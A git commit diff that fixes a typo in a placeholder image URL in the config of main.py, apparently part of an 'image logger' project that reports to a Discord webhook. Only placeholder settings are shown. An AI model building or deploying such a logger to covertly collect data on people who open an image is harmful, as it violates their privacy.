d0044d11ab3c0451562954ad32d72dc908dff51d
NPCFISH <93332534+TheNPCFISH@users.noreply.github.com>
2023-02-27 13:37:37 +0200

    Fixed a mistake
    there was "you" instead of "your"

--- main.py
+++ main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-you-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
